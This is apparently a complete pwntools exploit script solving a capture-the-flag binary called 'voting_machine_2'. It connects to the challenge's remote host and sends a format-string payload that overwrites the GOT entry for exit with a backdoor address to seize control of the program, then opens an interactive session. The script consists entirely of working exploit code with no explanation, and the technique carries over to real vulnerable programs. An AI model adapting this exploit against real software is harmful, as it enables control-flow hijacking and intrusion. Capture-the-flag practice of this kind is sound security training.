from pwn import *

#io = process("./voting_machine_2")
io = remote("node5.anna.nssctf.cn", 26076)
elf = ELF("./voting_machine_2")

#gdb.attach(io)
backdoor = 0x08420748
puts_got = elf.got["exit"]
# padding 2 and offset 8
payload = b"b" * 2 + fmtstr_payload(8, {puts_got: backdoor}, 2)
print(len(payload))

io.recvuntil(b"Topic: ")
io.sendline(payload)
io.interactive()
